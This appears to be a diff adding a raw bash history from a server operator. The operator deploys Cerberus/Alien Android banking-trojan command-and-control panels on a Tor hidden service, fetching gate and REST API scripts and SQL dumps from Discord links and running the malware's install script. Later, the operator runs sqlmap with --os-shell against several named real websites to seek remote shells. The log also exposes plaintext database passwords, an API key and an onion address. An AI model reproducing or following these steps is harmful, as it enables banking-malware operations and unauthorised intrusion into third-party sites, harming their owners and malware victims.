@@ -1,0 +1,774 @@
+   1  clear
+    2  ls
+    3  cd ..
+    4  ls
+    5  lcear
+    6  ls
+    7  clear
+    8  ls
+    9  cd panel/
+   10  ls
+   11  npm i
+   12  ls
+   13  clear
+   14  ls
+   15  npm run build
+   16  ls
+   17  mv build /var/www/tor/
+   18  clear
+   19  ls
+   20  cd /var/www/tor/
+   21  ls
+   22  rm -rf config.json
+   23  rm -rf config.php
+   24  cd build/
+   25  ls
+   26  mv * ..
+   27  cd ..
+   28  ls
+   29  clear
+   30  ls
+   31  nano /etc/nginx/sites-available/default
+   32  qinjgmcdujgass2xvpzbflg2brykuyw6sqd5kerttakz7anqtmsc22ad.onion
+   33  FPMVERSION=$(find /run/php/ -name 'php7.*-fpm.sock' | head -n 1)
+   34  service tor restart
+   35  service nginx restart
+   36  service tor status
+   37  ls
+   38  nano config.
+   39  nano config.php
+   40  mysql -u root -p
+   41  clear
+   42  ls
+   43  cd /home/
+   44  ls
+   45  cd V1
+   46  ls
+   47  cd ..
+   48  ls
+   49  cd alien/
+   50  ls
+   51  cd panel/
+   52  ls
+   53  cd src/
+   54  ls
+   55  cd ..
+   56  ls
+   57  cd /home/
+   58  ls
+   59  cd alien/
+   60  ls
+   61  cp -r zbab /var/www/tor/
+   62  cd /var/www/tor/
+   63  ls
+   64  clear
+   65  ls
+   66  chmod -R 777 *
+   67  clear
+   68  ls
+   69  clear
+   70  ls
+   71  cd home/
+   72  ls
+   73  cd alien/
+   74  ls
+   75  cd ..
+   76  ls
+   77  cd /var/www/tor/
+   78  ls
+   79  cd /home/
+   80  ls
+   81  cd alien/
+   82  ls
+   83  cd panel/
+   84  ls
+   85  npm run build
+   86  npm install util
+   87  ls
+   88  rm -rf node_modules/
+   89  ls
+   90  clear
+   91  ls
+   92  nano in
+   93  nano info.txt
+   94  ls
+   95  cd ..
+   96  l
+   97  sclear
+   98  ls
+   99  clear
+  100  cd ..
+  101  ls
+  102  clear
+  103  ls
+  104  cd cerberus_research
+  105  ls
+  106  cd cerberus_research
+  107  rm -rf cerberus_research
+  108  rm -rf cerberus_research-master/
+  109  clear
+  110  ls
+  111  git clone https://github.com/ics-iot-bootcamp/cerberus_research
+  112  ls
+  113  unzip cerberus_research
+  114  cd cerberus_research
+  115  ls
+  116  cd cerberus_
+  117  ls
+  118  cd cerberus_full_package/
+  119  ls
+  120  cd v1
+  121  ls
+  122  cd V1/
+  123  ls
+  124  clear
+  125  ls
+  126  cd ..
+  127  ls
+  128  mv V1/ /home/
+  129  cd /home/
+  130  ls
+  131  cd v1
+  132  cd V1/
+  133  ls
+  134  cd panel/
+  135  ls
+  136  npm run build
+  137  cd public/
+  138  ls
+  139  cd ..
+  140  ls
+  141  clear
+  142  ls
+  143  ./b
+  144  ./build.sh
+  145  sudo su
+  146  clear
+  147  ls
+  148  cd alien/
+  149  ls
+  150  cd panel/
+  151  ls
+  152  clear
+  153  ls
+  154  cd src/
+  155  ls
+  156  cd /home/
+  157  mkdir src
+  158  clear
+  159  l
+  160  cd alien/panel/src/
+  161  ls
+  162  cp -R * /home/src/
+  163  ls
+  164  clear
+  165  cd /home/
+  166  ls
+  167  cd src/
+  168  ls
+  169  cd ..
+  170  ls
+  171  cd src/
+  172  ls
+  173  cd ..
+  174  ls
+  175  cd v1
+  176  cd V1
+  177  ls
+  178  cd panel/
+  179  ls
+  180  cd src/
+  181  ls
+  182  rm -rf pages/
+  183  ls
+  184  cd /home/
+  185  ls
+  186  cd src/
+  187  ls
+  188  cp -R pages/ /home/V1/panel/src/
+  189  ls
+  190  cd /home/V1/panel/
+  191  ls
+  192  clear
+  193  ls
+  194  cd src/
+  195  ls
+  196  cd ..
+  197  ls
+  198  npm run build
+  199  cd ..
+  200  ls
+  201  clear
+  202  ls
+  203  cd ..
+  204  ls
+  205  cd src/
+  206  ls
+  207  cd /home/V1
+  208  ls
+  209  cd panel/
+  210  ls
+  211  cd src/
+  212  ls
+  213  rm -rf *
+  214  clear
+  215  ls
+  216  cd /home/
+  217  ls
+  218  cd src/
+  219  ls
+  220  cp -R * /home/V1/panel/src/
+  221  cd /home/V1/
+  222  ls
+  223  cd panel/
+  224  ls
+  225  npm run build
+  226  ls
+  227  clear
+  228  ls
+  229  cd /var/www/tor/
+  230  ls
+  231  mkdir falanfilan
+  232  mv db.php falanfilan/
+  233  mv restapi.php falanfilan/
+  234  clear
+  235  ls
+  236  rm -rf asset-manifest.json
+  237  ls
+  238  rm -rf *
+  239  clear
+  240  ls
+  241  cd /home/V1/
+  242  ls
+  243  cd panel/
+  244  ls
+  245  rm -rf build
+  246  npm run build
+  247  ls
+  248  mv build /var/www/tor/
+  249  ls
+  250  cd /var/www/tor/
+  251  ls
+  252  cd build/
+  253  ls
+  254  mv * ..
+  255  cd ..
+  256  ls
+  257  cd ..
+  258  ls
+  259  cd tor/
+  260  ls
+  261  clear
+  262  ls
+  263  nano config.php
+  264  clear
+  265  ls
+  266  a
+  267  cd ..
+  268  ls
+  269  clear
+  270  ls
+  271  cd /home/
+  272  ls
+  273  cd V1
+  274  ls
+  275  clear
+  276  ls
+  277  cd panel/
+  278  ls
+  279  cd public/
+  280  ls
+  281  nano index.html
+  282  clear
+  283  ls
+  284  cd i
+  285  cd img/
+  286  ls
+  287  clear
+  288  ls
+  289  cd ..
+  290  ls
+  291  rm -rf img/
+  292  clear
+  293  ls
+  294  wget https://cdn.discordapp.com/attachments/918509508005863514/967902524646510612/img.zip
+  295  clear
+  296  ls
+  297  unzip img.zip
+  298  clear
+  299  ls
+  300  rm -rf img.zip
+  301  clear
+  302  ls
+  303  cd ..
+  304  ls
+  305  cd public/
+  306  ls
+  307  nano index.html
+  308  clear
+  309  ls
+  310  cd ..
+  311  ls
+  312  npm run build
+  313  ls
+  314  cd /var/www/tor/
+  315  ls
+  316  rm -rf *
+  317  clear
+  318  ls
+  319  cd /home/V1/
+  320  ls
+  321  clear
+  322  ls
+  323  cd panel/
+  324  ls
+  325  cp -R build /var/www/tor/
+  326  ls
+  327  cd /var/www/tor/
+  328  ls
+  329  cd build/
+  330  ls
+  331  mv * ..
+  332  clear
+  333  ls
+  334  cd ..
+  335  ls
+  336  rm -rf buil
+  337  rm -rf build
+  338  clear
+  339  ls
+  340  rm -rf favicon.ico
+  341  cd /home/V1
+  342  ls
+  343  clear
+  344  ls
+  345  cd pa
+  346  cd panel/
+  347  ls
+  348  cd public/
+  349  ls
+  350  rm -rf favicon.ico
+  351  clear
+  352  ls
+  353  cd /var/www/tor/
+  354  ls
+  355  clear
+  356  ls
+  357  chmod -R 777 *
+  358  ls
+  359  nano precache-manifest.1b9e1e71aacf6776a4d7cf7565631dd0.js
+  360  ls
+  361  cd /var/www/tor/
+  362  ls
+  363  nano config.php
+  364  mysql -u root -p
+  365  clear
+  366  l
+  367  clear
+  368  ls
+  369  clear
+  370  l
+  371  cd /home
+  372  l
+  373  rm -rf
+  374  rm -rf *
+  375  clear
+  376  l
+  377  wget https://github.com/ics-iot-bootcamp/cerberus_research.git
+  378  wget https://github.com/ics-iot-bootcamp/cerberus_research/archive/refs/heads/master.zip
+  379  apt install unzip
+  380  unzip master.zip
+  381  clear
+  382  l
+  383  cd cerberus_research-master/
+  384  l
+  385  cd cerberus_full_package/
+  386  l
+  387  cd v
+  388  cd V1/
+  389  l
+  390  clear
+  391  l
+  392  cd panel/
+  393  l
+  394  wget https://cdn.discordapp.com/attachments/916959638560321606/918737981764947998/v10.zip
+  395  mkdir astast
+  396  mv v10.zip astast/
+  397  cd astast/
+  398  unzip v10.zip
+  399  l
+  400  mv CERBERUS_V2.sh ..
+  401  cd ..
+  402  clear
+  403  l
+  404  chmod 777 *
+  405  ./CERBERUS_V2.sh
+  406  clear
+  407  l
+  408  cat /var/lib/tor/cerberus/hostname
+  409  nano /etc/nginx/sites-available/default
+  410  l
+  411  mysql -uroot --password="wiskey" bot < bot.sql
+  412  nano src/pages/BuilderConfig.js
+  413  curl -sL https://deb.nodesource.com/setup_11.x | sudo -E bash -
+  414  clear
+  415  l
+  416  passwd root
+  417  apt install phpmyadmin
+  418  cd ..
+  419  cd .
+  420  cd /home
+  421  mkdir alien
+  422  cd alien
+  423  clear
+  424  l
+  425  wget https://cdn.discordapp.com/attachments/918509508005863514/967885350083129374/aliennew.zip
+  426  unzip aliennew.zip
+  427  l
+  428  cd panel/
+  429  l
+  430  rm -rf node_modules/
+  431  curl -sL https://deb.nodesource.com/setup_11.x | sudo -E bash -
+  432  curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+  433  sudo apt-get install -y nodejs
+  434  npm install
+  435  npm audit fix --force
+  436  npm update
+  437  npm install -g npm@latest
+  438  rm -rf node_modules
+  439  npm install
+  440  npm audit fix --force
+  441  npm update
+  442  npm run build && rm -f -rf /var/www/tor && mkdir /var/www/tor && cp -R build/. /var/www/tor
+  443  l
+  444  cd src/
+  445  l
+  446  cd pages/
+  447  l
+  448  nano builder.js
+  449  l
+  450  cd ..
+  451  l
+  452  cd ..
+  453  claer
+  454  l
+  455  clear
+  456  l
+  457  cd src/
+  458  l
+  459  cd pages/
+  460  l
+  461  cd ..
+  462  nano index.js
+  463  cd ..
+  464  l
+  465  cd ..
+  466  l
+  467  wget https://cdn.discordapp.com/attachments/918509508005863514/967892035711410266/lonercu_alien.sql
+  468  mv lonercu_alien.sql.1 bot.sql
+  469  mysql -uroot --password="wiskey" bot < bot.sql
+  470  l
+  471  cd restapi/
+  472  l
+  473  nano restapi.php
+  474  nano /var/www/tor/config.json
+  475  l
+  476  rm -rf *
+  477  wget https://cdn.discordapp.com/attachments/918509508005863514/967895212183678986/restapi.php
+  478  chmod 777 restapi.php
+  479  mv restapi.php /var/www/tor
+  480  nano /var/www/tor/config.json
+  481  cd ..
+  482  cd gate/
+  483  l
+  484  chmod 777 gate.php
+  485  mv /var/www/tor/restapi.php /home/alien/restapü
+  486  mv /var/www/tor/restapi.php /home/alien/restapi
+  487  l
+  488  cd ..
+  489  l
+  490  mv restapü restapi.php
+  491  cd .
+  492  cd ..
+  493  l
+  494  cd cerberus_research/
+  495  l
+  496  cd ..
+  497  cd V1/
+  498  l
+  499  cd restapi/
+  500  l
+  501  nano restapi
+  502  nano restapi.php
+  503  rm -rf db.php
+  504  wget https://cdn.discordapp.com/attachments/918509508005863514/967897211725832313/db.php,
+  505  wget https://cdn.discordapp.com/attachments/918509508005863514/967897211725832313/db.php
+  506  chmod 777 *
+  507  mv * /var/www/tor
+  508  cd ..
+  509  l
+  510  passwd gasx
+  511  cd ..
+  512  l
+  513  cd alien/
+  514  l
+  515  cd panel/src/pages/buil
+  516  cd panel/src/pages/
+  517  l
+  518  nano builder.js
+  519  clear
+  520  l
+  521  cd ..
+  522  l
+  523  cd ..
+  524  l
+  525  cd /var/www/tor
+  526  l
+  527  nano config.json
+  528  nano config.php
+  529  l
+  530  nano config.php
+  531  nano config.json
+  532  cd /home
+  533  l
+  534  cd alien/
+  535  l
+  536  cp restapi.php /var/www/tor
+  537  nano /var/www/tor/restapi.php
+  538  rm restapi.php
+  539  wget https://cdn.discordapp.com/attachments/918509508005863514/967904434426372146/restapi.php
+  540  cp restapi.php /var/www/tor
+  541  rm -rf /var/www/tor/restapi.php
+  542  cp restapi.php /var/www/tor
+  543  l
+  544  cd restapi/
+  545  l
+  546  wget https://cdn.discordapp.com/attachments/918509508005863514/967871749540704286/restapi.php
+  547  sed -i "s/..key../T3VKLKUGo3KuKx5/g" restapi.php
+  548  sed -i "s/..passwd../wiskey/g" restapi.php
+  549  cp restapi.php /var/www/tor
+  550  l
+  551  cd ..
+  552  lş
+  553  l
+  554  mysql -uroot --password="user" -e "CREATE DATABASE database /*\!40100 DEFAULT CHARACTER SET utf8 */;"
+  555  mysql -uroot --password="user" -e "CREATE USER 'user'@'localhost' IDENTIFIED BY 'user';"
+  556  mysql -uroot --password="user" bot < lonercu_alien.sql
+  557  mysql -uroot --password="user" -e "GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost';"
+  558  mysql -uroot --password="user" -e "FLUSH PRIVILEGES;"
+  559  cd ..
+  560  cd V1/
+  561  l
+  562  cd restapi/
+  563  l
+  564  cd /var/www/tor
+  565  lş
+  566  l
+  567  rm -rf restapi.php
+  568  wget https://cdn.discordapp.com/attachments/918509508005863514/967905933302857778/restapi_partner.php
+  569  wget https://cdn.discordapp.com/attachments/918509508005863514/967905933495762984/db.php
+  570  wget https://cdn.discordapp.com/attachments/918509508005863514/967905933302857778/restapi_partner.php
+  571  chmod 777 *
+  572  wget https://cdn.discordapp.com/attachments/918509508005863514/967905933793570826/restapi.php
+  573  rm -rf restapi.php
+  574  rm -rf restapi_partner.php
+  575  rm -rf restapi_partner.php.1
+  576  rm -rf db.php
+  577  cd /home
+  578  l
+  579  cd alien/
+  580  l
+  581  cd gate/
+  582  l
+  583  rm -rf *
+  584  wget https://cdn.discordapp.com/attachments/918509508005863514/967858562359508992/gate.php
+  585  wget https://cdn.discordapp.com/attachments/918509508005863514/967858562695065650/restapi.php
+  586  sed -i "s/..key../$apicryptkey/g" gate.php
+  587  sed -i "s/..passwd../$sqlpassword/g" gate.php
+  588  sed -i "s/..passwd../wiskey/g" gate.php
+  589  sed -i "s/..key../T3VKLKUGo3KuKx5/g" gate.php
+  590  chmod 777 *
+  591  mv gate.php /var/www/gate/index.php
+  592  mkdir /var/www/gate
+  593  mv gate.php /var/www/gate/index.php
+  594  sed -i "s/..key../T3VKLKUGo3KuKx5/g" restapi.php
+  595  sed -i "s/..passwd../wiskey/g" restapi.php
+  596  mv restapi.php /var/www/tor
+  597  cd /home/alien/
+  598  l
+  599  cd panel/src/pages/
+  600  l
+  601  nano builder.js
+  602  clear
+  603  l
+  604  cd /home
+  605  l
+  606  cd V1/
+  607  l
+  608  cd panel/
+  609  l
+  610  cd src/
+  611  l
+  612  cd pages/
+  613  l
+  614  nano builder.js
+  615  clear
+  616  l
+  617  lş
+  618  l
+  619  clear
+  620  l
+  621  mkdir alienv2
+  622  cd alien
+  623  l
+  624  cd ..
+  625  cd alienv2
+  626  wget https://cdn.discordapp.com/attachments/918509508005863514/968530132631433306/alien.zip
+  627  unzip alien.zip
+  628  l
+  629  mysql -uroot --password="user" bot < nope_1.sql
+  630  nano gate.php
+  631  nano restapi.php
+  632  nano install.sh
+  633  cat /var/lib/tor/cerberus/hostname
+  634  nano install.sh
+  635  sed -i "s/\.\.key\.\./T3VKLKUGo3KuKx5/g" restapi.php
+  636  sed -i "s/\.\.passwd\.\./wiskey/g" restapi.php
+  637  sed -i "s/\.\.key\.\./T3VKLKUGo3KuKx5/g" gate.php
+  638  sed -i "s/\.\.passwd\.\./wiskey/g" gate.php
+  639  cp restapi.php /var/www/restapi/index.php
+  640  mkdir /var/www/restapi
+  641  cp restapi.php /var/www/tor
+  642  wget https://cdn.discordapp.com/attachments/918509508005863514/968532330471911504/nope_1.sql
+  643  rm nope_1.sql
+  644  rm nope_1.sql.1
+  645  wget https://cdn.discordapp.com/attachments/918509508005863514/968532330471911504/nope_1.sql
+  646  mysql -uroot --password="user" bot < nope_1.sql
+  647  rm -rf *
+  648  wget https://cdn.discordapp.com/attachments/918509508005863514/968532973148328007/gate.php
+  649  wget https://cdn.discordapp.com/attachments/918509508005863514/968532973580329060/restapi.php
+  650  cp restapi.php /var/www/tor
+  651  cp gate.php /var/www/gate/index.php
+  652  cp restapi.php /var/www/restapi/index.php
+  653  find /run/php/ -name 'php7.*-fpm.sock' | head -n 1
+  654  clear
+  655  l
+  656  wget https://cdn.discordapp.com/attachments/918509508005863514/968537742604652584/install.sh
+  657  bash install.sh
+  658  wget https://cdn.discordapp.com/attachments/918509508005863514/968532330471911504/nope_1.sql
+  659  mysql -uroot --password="" -e 'CREATE DATABASE `database`;'
+  660  mysql -uroot --password="" -e "CREATE USER 'user'@'localhost' IDENTIFIED BY 'T3VKLKUGo3KuKx5';"
+  661  mysql -uroot --password="" -e 'use `database`; source /home/alienv2/nope_1.sql;'
+  662  mysql -uroot --password="" -e "GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost';"
+  663  mysql -uroot --password="" -e "FLUSH PRIVILEGES;"
+  664  mkdir 2
+  665  cd 2
+  666  wget https://cdn.discordapp.com/attachments/918509508005863514/968530132631433306/alien.zip
+  667  unzip alien.zip
+  668  mv restapi.php ...
+  669  mv restapi.php ..
+  670  cd ..
+  671  l
+  672  rm -rf gate.php
+  673  rm -rf restapi.php
+  674  cd 2
+  675  l
+  676  unzip alien.zip
+  677  y
+  678  l
+  679  rm -rf gate.php
+  680  rm -rf *
+  681  wget https://cdn.discordapp.com/attachments/918509508005863514/968530132631433306/alien.zip
+  682  unzip alien.zip
+  683  mv restapi.php ..
+  684  mv gate.php ..
+  685  l
+  686  cd ..
+  687  l
+  688  sed -i "s/\.\.key\.\./T3VKLKUGo3KuKx5/g" restapi.php
+  689  sed -i "s/\.\.passwd\.\./wiskey/g" restapi.php
+  690  cp /home/alienv2/restapi.php /var/www/restapi/index.php
+  691  sed -i "s/\.\.key\.\./T3VKLKUGo3KuKx5/g" gate.php
+  692  sed -i "s/\.\.passwd\.\./wiskey/g" gate.php
+  693  cp /home/alienv2/gate.php /var/www/gate/index.php
+  694  cp restapi.php /var/www/tor
+  695  sqlmap
+  696  snap install sqlmap
+  697  sqlmap -u "https://ubiqua.ong.br/mod/page/view.php?id=15" --os-shell
+  698  sqlmap -u "https://ubiqua.ong.br/mod/page/view.php?id=15" --os-shell --random-agent
+  699  sqlmap -u "https://ubiqua.ong.br/mod/page/view.php?id=15" --dbs
+  700  sqlmap -u https://www.ccbe.eu/index.php?id=12&L=0 --dbs
+  701  y
+  702  sqlmap -u https://www.newseye.eu/index.php?id=162 --os-shell
+  703  l
+  704  cd /home
+  705  l
+  706  cd /home
+  707  l
+  708  cd alienv2/
+  709  l
+  710  cd ..
+  711  cd alien
+  712  l
+  713  cd ..
+  714  cd V1/
+  715  l
+  716  cd panel/
+  717  l
+  718  cd src/
+  719  l
+  720  cd pages/
+  721  l
+  722  cd ..
+  723  l
+  724  cd ..
+  725  passwd root
+  726  sudo apt-get install libc6-dev-i386 lib32z1 openjdk-8-jdk -y ; sudo apt install default-jdk -y ; sudo apt update && sudo apt install android-sdk -y ; cd /home/ ; wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip ; unzip sdk-tools-linux-3859397.zip
+  727  sudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils -y ; sudo apt install xrdp -y ; sudo adduser xrdp ssl-cert ; sudo systemctl restart xrdp ; sudo ufw allow from 192.168.1.0/24 to any port 3389 ; sudo ufw allow 3389
+  728  sudo passwd -dl root
+  729  sudo passwd --delete --lock root
+  730  sudo systemctl restart apache2
+  731  $ sudo adduser trm sudo
+  732  sudo adduser sem sudo
+  733  sudo adduser gasx sudo
+  734  PermitRootLogin yes
+  735  usermod -aG sudo root
+  736  sudo some-command
+  737  sudo visudo
+  738  sudo passwd root
+  739  sudo apt-get update
+  740  sudo apt update
+  741  sudo apt upgrade
+  742  sudo apt update
+  743  sudo apt upgrade
+  744  sudo apt full-upgrade
+  745  history
+  746  clear
+  747  l
+  748  cd /home
+  749  l
+  750  cd alien
+  751  l
+  752  cd ..
+  753  cd V1/
+  754  L
+  755  l
+  756  zip panel/
+  757  apt install zip
+  758  zip -r aliensrc.zip panel/
+  759  l
+  760  cd builder/
+  761  l
+  762  nano build.php
+  763  l
+  764  cd ..
+  765  l
+  766  cd ..
+  767  l
+  768  cd alienv2/
+  769  l
+  770  cd ..
+  771  l
+  772  cd alienv2/
+  773  l
+  774  history
